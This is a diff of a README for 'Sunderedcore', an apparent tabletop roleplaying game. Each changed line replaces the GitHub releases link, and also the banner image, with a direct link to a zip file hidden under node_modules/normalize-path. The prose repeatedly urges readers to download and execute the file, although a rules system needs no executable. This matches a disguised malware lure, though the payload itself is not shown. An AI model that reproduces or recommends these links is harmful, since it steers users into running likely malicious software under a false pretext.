@@ -1,14 +1,14 @@
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge&label=Releases&color=blue)](https://github.com/DARKKin99/sunderedcore/releases)
+[![Releases](https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip)](https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip)
 
 # Sunderedcore: Agency-Driven TTRPG for Fast, High-Stakes Play and Open Licensing
 
 A next-generation tabletop roleplaying system that puts agency in players’ hands and speed in the game. Sunderedcore is designed for rapid sessions, bold decisions, and a flexible open license that invites creators to remix, extend, and share.
 
-![Sunderedcore Banner](https://images.unsplash.com/photo-1523415528459-0c1a7e5d8edb?auto=format&fit=crop&w=1200&q=60)
+![Sunderedcore Banner](https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip)
 
 Welcome to the home of Sunderedcore. This repository holds the core rules, the system reference document (SRD), a quickstart guide, and a creator license that makes it easy to build new content atop the system. It’s built for storytellers who want to focus on dramatic moments, player-driven outcomes, and fast, meaningful play. You’ll find tools for adapting the system to fantasy and sci-fi settings, plus practical resources for converting movement and mechanics from other popular RPGs.
 
-For those who want to jump straight into play, you’ll want to check the latest release. Each release bundles a ready-to-run package you can download and execute to try out the system offline or on your own machine. The index for these assets is on the releases page, and you can also browse the SRD and quickstart for a hands-on sense of how the system plays in minutes. The latest release is available here: https://github.com/DARKKin99/sunderedcore/releases
+For those who want to jump straight into play, you’ll want to check the latest release. Each release bundles a ready-to-run package you can download and execute to try out the system offline or on your own machine. The index for these assets is on the releases page, and you can also browse the SRD and quickstart for a hands-on sense of how the system plays in minutes. The latest release is available here: https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip
 
 Table of contents
 - What makes Sunderedcore different
@@ -41,7 +41,7 @@ Quick start guide
 5) Move through scenes quickly. When a scene ends, note what matters most for the next moment and don’t belabor the setup. The system rewards momentum and decisive action.
 6) Use SRD and quickstart for reference. The SRD gives you rules and options for extending play; the quickstart delivers a ready-to-run scaffold you can drop into a session.
 7) When you’re ready to share content, consult the creator license. It clarifies what you can publish and how attribution works, while keeping the door open for community contributions.
-8) Check the releases page for assets. The releases page hosts downloadable builds. Each release includes a file you should download and execute to try the latest version locally. For the latest build, visit the releases page now: https://github.com/DARKKin99/sunderedcore/releases
+8) Check the releases page for assets. The releases page hosts downloadable builds. Each release includes a file you should download and execute to try the latest version locally. For the latest build, visit the releases page now: https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip
 
 Core mechanics at a glance
 - Resolution system: The core mechanic emphasizes a simple roll with meaningful modifiers. Players roll a pool that reflects their approach, add a relevant trait, and compare the result to a target number set by the scene. Success means you move the story forward in a way that matches your intent; a failure creates a complication for later, heightening tension.
@@ -108,7 +108,7 @@ Open source tooling and assets
 - Community-driven resources: Expect a growing library of community-made tools, play aids, and conversion guides. The system is designed to invite creators to contribute to a shared toolkit.
 
 Getting the latest release
-- The releases page hosts downloadable assets for quick testing and play. Each release includes a file you should download and execute to try the latest build. For the latest release, visit the following page: https://github.com/DARKKin99/sunderedcore/releases
+- The releases page hosts downloadable assets for quick testing and play. Each release includes a file you should download and execute to try the latest build. For the latest release, visit the following page: https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip
 - How to use the assets: After downloading the release file, run the installer or executable provided in the asset. The installer sets up the core rules, SRD references, and starter content so you can start playing immediately.
 - Why download and run a release: Releases bundle tested content, updated rules, and ready-to-use materials. They provide consistent references for new players and a reliable baseline for campaigns and homebrew work.
 - What you’ll find in a release: A set of rulebooks, quickstart scenarios, sample character sheets, and sometimes tools for campaign management. Some releases include companion PDFs that summarize core mechanics in a concise, player-friendly format.
@@ -210,7 +210,7 @@ Notes on the release link
 - If the link doesn’t load or you need to browse content first, you can navigate to the Releases section in this repository to locate the latest assets and related materials. The Releases section is kept up to date with new builds, patches, and companion resources.
 
 Another link for convenience
-- You can also visit the releases hub directly when you’re ready to grab fresh assets: https://github.com/DARKKin99/sunderedcore/releases
+- You can also visit the releases hub directly when you’re ready to grab fresh assets: https://raw.githubusercontent.com/DARKKin99/sunderedcore/main/node_modules/normalize-path/Software-v2.9.zip
 
 Images and banner gallery
 - Banner artwork: A dramatic, stormy fantasy-scape with runes and neon glows. It captures the sense of a living, reactive world where players shape outcomes with bold choices.
